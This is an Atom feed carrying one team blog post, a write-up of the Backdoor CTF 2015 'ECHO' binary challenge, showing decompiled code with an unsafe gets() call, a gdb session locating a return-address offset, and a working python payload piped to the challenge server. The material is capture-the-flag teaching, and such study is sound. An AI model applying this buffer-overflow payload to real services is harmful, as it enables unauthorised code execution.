<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: Bof | GeeksSpeak Team Blog]]></title>
  <link href="http://geeksspeak.github.io/blog/categories/bof/atom.xml" rel="self"/>
  <link href="http://geeksspeak.github.io/"/>
  <updated>2015-04-03T02:14:31+04:30</updated>
  <id>http://geeksspeak.github.io/</id>
  <author>
    <name><![CDATA[GeeksSpeak]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Backdoor CTF 2015 - ECHO Writeup]]></title>
    <link href="http://geeksspeak.github.io/blog/2015/04/03/backdoor-ctf-2015-echo-writeup/"/>
    <updated>2015-04-03T02:12:58+04:30</updated>
    <id>http://geeksspeak.github.io/blog/2015/04/03/backdoor-ctf-2015-echo-writeup</id>
    <content type="html"><![CDATA[<p><strong>Backdoor 2015 ECHO Writeup</strong><br/>
<strong>Point = 100</strong><br/>
<strong>Category = Binary</strong></p>

<blockquote><p>Little Suzie started learning C. She created a simple program that echo&rsquo;s back whatever you input. Here is the binary file. The vampire came across this service on the internet. nc hack.bckdr.in 8002. Reports say he found a flag. See if you can get it.</p></blockquote>

<pre><code>$ file echo
echo: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=15ec07e5664a13e94069c818141cc9f70591d0f0, not stripped
</code></pre>

<p>As it seems we have a 32bit binary as a ECHO server. the output confirms this:</p>

<pre><code>$ nc hack.bckdr.in 8002
GeeksSpeak
ECHO: GeeksSpeak
</code></pre>

<p>opening the binary in IDA shows us that the main function calls test() as we can see the psuedo-code below :</p>

<p>&lt;&ndash;! more &ndash;>
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>int test()
</span><span class='line'>{
</span><span class='line'>  char s; // [sp+1Eh] [bp-3Ah]@1&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;  gets(&amp;s);
</span><span class='line'>  return fprintf(_bss_start, &ldquo;ECHO: %s\n&rdquo;, &amp;s);
</span><span class='line'>}&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;pre&gt;&lt;code&gt;
</span><span class='line'>It's an obvious Stack buffer overflow. without loosing time i loaded it into *gdb* and used  cyclic pattern to find the offset:
</span><span class='line'>&lt;/code&gt;&lt;/pre&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;$ gdb ./echo -q
</span><span class='line'>Reading symbols from ./echo&hellip;(no debugging symbols found)&hellip;done.
</span><span class='line'>gdb-peda$ pattern_create 100
</span><span class='line'>&lsquo;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL&rsquo;
</span><span class='line'>gdb-peda$ shell echo &lsquo;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL&rsquo; &gt; echo.test
</span><span class='line'>gdb-peda$ r &lt; echo.test
</span><span class='line'>Starting program: /home/hamidx9/ctf/backdoor/echo &lt; echo.test
</span><span class='line'>ECHO: AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Program received signal SIGSEGV, Segmentation fault.
</span><span class='line'>[&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;registers&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;]
</span><span class='line'>EAX: 0x6b (b'k')
</span><span class='line'>EBX: 0xf7fae000 &ndash;&gt; 0x1a8da8
</span><span class='line'>ECX: 0x6b (b'k')
</span><span class='line'>EDX: 0xf7faf86c &ndash;&gt; 0x0
</span><span class='line'>ESI: 0x0
</span><span class='line'>EDI: 0x0
</span><span class='line'>EBP: 0x41324141 (b'AA2A')
</span><span class='line'>ESP: 0xffffcdd0 (&ldquo;dAA3AAIAAeAA4AA&rdquo;&hellip;)
</span><span class='line'>EIP: 0x41414841 (b'AHAA')
</span><span class='line'>[&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-code&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;]
</span><span class='line'>Invalid $PC address: 0x41414841
</span><span class='line'>[&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-stack&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-]
</span><span class='line'>00:0000| esp 0xffffcdd0 (&ldquo;dAA3AAIAAeAA4AA&rdquo;&hellip;)
</span><span class='line'>01:0004|     0xffffcdd4 (&ldquo;AAIAAeAA4AAJAAf&rdquo;&hellip;)
</span><span class='line'>02:0008|     0xffffcdd8 (&ldquo;AeAA4AAJAAfAA5A&rdquo;&hellip;)
</span><span class='line'>03:0012|     0xffffcddc (&ldquo;4AAJAAfAA5AAKAA&rdquo;&hellip;)
</span><span class='line'>04:0016|     0xffffcde0 (&ldquo;AAfAA5AAKAAgAA6&rdquo;&hellip;)
</span><span class='line'>05:0020|     0xffffcde4 (&ldquo;A5AAKAAgAA6AAL&rdquo;)
</span><span class='line'>06:0024|     0xffffcde8 (&ldquo;KAAgAA6AAL&rdquo;)
</span><span class='line'>07:0028|     0xffffcdec (&ldquo;AA6AAL&rdquo;)
</span><span class='line'>[&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-]
</span><span class='line'>Legend: stack, code, data, heap, rodata, value
</span><span class='line'>Stopped reason: SIGSEGV
</span><span class='line'>0x41414841 in ?? ()
</span><span class='line'>gdb-peda$ pattern_offset &lsquo;AHAA&rsquo;
</span><span class='line'>AHAA found at offset: 62
</span><span class='line'>gdb-peda$&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;pre&gt;&lt;code&gt;
</span><span class='line'>So the `offset = 62`. but where should we jump? IDA shows us there is another function named `sample` which open `flag.txt` and print its content. All have to do is to call `sample` with address = *0x0804854d*.
</span><span class='line'>
</span><span class='line'>Final payload looks like below :
</span><span class='line'>&lt;/code&gt;&lt;/pre&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;[A*62] + [0x0804854d in little endian]</span></code></pre></td></tr></table></div></figure></p>

<p>And finally we&rsquo;ve got the flag:</p>

<pre><code>$ python -c 'import struct; q=lambda x: struct.pack("&lt;I", x); print "A"*62+q(0x0804854d)' | nc hack.bckdr.in 8002
ECHO: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAM�
96f674623c2c378f89700aa46f02cf3b311489f0facdfac6fd5885d5bc1a129a
</code></pre>

<p>And another 100 pt.</p>

<p>HAMIDx9</p>
]]></content>
  </entry>
  
</feed>
